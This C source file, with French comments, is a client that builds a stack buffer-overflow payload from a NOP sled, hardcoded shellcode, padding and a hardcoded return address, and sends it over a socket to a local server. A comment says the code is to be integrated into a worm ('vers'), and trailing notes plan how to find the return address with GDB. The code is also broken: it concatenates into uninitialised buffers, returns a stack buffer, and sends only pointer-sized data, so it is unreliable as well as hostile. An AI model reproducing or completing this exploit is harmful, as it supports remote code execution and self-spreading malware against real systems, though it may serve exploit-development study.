#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h> // inet_addr()
#include <sys/socket.h>
#include <unistd.h> 
#define MAX 80
#define PORT 8080
#define SA struct sockaddr

// Voir fonction strcat pour concaténer des chars (string.h)

size_t pay_size;


unsigned long get_sp(void) {
__asm__("movq %rsp,%rax");
}


const char* crafted_payload(){

	// Serie de NOP
	int nb_nop = 40;
	char nops[nb_nop];
	char un_nop[] = "\x90";
	for (int i = 0; i < nb_nop; i++){
		nops[i] = *un_nop;
	}
	//printf("%s\n", nops);

	// Shellcode en dur
	char shellcode[] = "\xf3\x48\x48\x48\x74\xff\x48\xc3\xff\xf2\x0f\xf3\x68\xf2\x90\xf3\xf2\x0f\xf3\xf2\x0f\xf3\x31\x49\x5e\x48\x48\x50\x54\x45\x31\x48\xff\xf4\x66\x00\x48\x48\x48\x74\x48\x48\x74\xff\x0f\xc3\x0f\x48\x48\x48\x48\x48\x48\x48\x48\x74\x48\x48\x74\xff\x66\xc3\x0f\xf3\x80\x75\x55\x48\x00\x48\x74\x48\xe8\xe8\xc6\x5d\xc3\x0f\xc3\x0f\xf3\xe9\xf3\x55\x48\x48\x48\xe8\xb8\x5d\xc3\xf3\x48\x48\xc3";
	//char shellcode[] = "\x48\x45\x4c\x4c\x43\x4f\x44\x45";
	//printf("%s\n", shellcode);

	// Padding de bp
	char padding_bp [] = "\x41\x41\x41\x41";
	//printf("%s\n", padding_bp);

	// Adresse de retour en dur
	char retour[] = "\x01\x40\x73\x74\x88\x34\x60\xb2";
	//char retour[] = "\x41\x44\x44\x52\x5f\x52\x45\x54";
	//printf("%s\n", retour);

	char final_buf[sizeof(nops) + sizeof(shellcode) + sizeof(padding_bp) + sizeof(retour)];

	strcat(final_buf, nops);
	strcat(final_buf, shellcode);
	strcat(final_buf, padding_bp);
	strcat(final_buf, retour);
	//printf("%s\n", final_buf);

	pay_size = sizeof(final_buf);
	printf("%zu\n", pay_size);

	char * pay = malloc(pay_size * sizeof(char));
	//printf("%zu\n", sizeof(pay));
	pay = final_buf;
	printf("%s\n", pay);

	return pay;
}


int func(int sockfd, const char *pay)
{
	printf("Overflow en cours...\n");
	int verif = write(sockfd, pay, sizeof(pay));
	if (verif == -1){
		printf("Error : Payload sending failed\n");
	}
	else {
		printf("Payload successfully send !\n");
	}
	return verif;
}




int main (int argc, char *argv[]){

	int sockfd, connfd;
	struct sockaddr_in servaddr, cli;

	// socket create and verification
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		printf("socket creation failed...\n");
		exit(0);
	}
	else
		printf("Socket successfully created..\n");
	bzero(&servaddr, sizeof(servaddr));

	// assign IP, PORT
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	servaddr.sin_port = htons(PORT);

	// connect the client socket to server socket
	if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr))
		!= 0) {
		printf("connection with the server failed...\n");
		exit(0);
	}
	else
		printf("connected to the server..\n");


	//int sockfd = 1; // A CHANGER ET METTRE L'ARG DE LA FCT A LA PLACE 

	//printf("%li\n", pay_size);
	/*char payload[pay_size];
	const char *str = crafted_payload();
	size_t len = strlen(str);
	printf("%li\n", sizeof(payload));
	memset(payload, 0, sizeof(payload));
	memcpy(payload, str, len);*/
	//snprintf(payload, pay_size, crafted_payload());


	const char* payload = crafted_payload();

	
    // Ecriture en dur du shellcode : 
    // NOP *40(etc 1 octet chaque)
	// + shellcode (taille à définir POUR TAILLE BOF) 
    // + "A" *4(1 octet chaque)
	// + @retour_dans_nop (== @relatif A CHERCHER GDB BASE PILE - [size(shellcode) + 4* A + moitié Nop])
    //char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x45\x4c\x4c\x43\x4f\x44\x45\x41\x41\x41\x41\x40"; // A COMPLETER

    // COMMENT @retour = @base pile + taille instruction ENTIERE

    // Envoi de la payload
	//long l=get_sp();
	//printf("Ox%lu\n", l);
	int over_flow = func(sockfd, payload);  // A DECOMMENTER UNE FOIS INTEGREE DANS LE VERS

    printf("%s\n", payload);
	printf("OK\n");
    return 0;
}



// A FAIRE

// d'abord avec petite data, faire sauter une instruction
// int a = 1
// strcpy(...) == overflow !
// int a = 50
// printf("%i", a);

// ne faire sauter QUE instruction pour a = 50
// afin de print a = 1

// d'ou utiliser GDB pour disass le code et retrouver les adresses des instructions
// et ainsi mettre en adresse de retour le printf
// (sauter juste instructions pour a = 50)

// on aura ainsi la certitude de l'adresse de retour



// autre inconnues : - shellcode qui s'exécute bien
//					 - payload bien craftée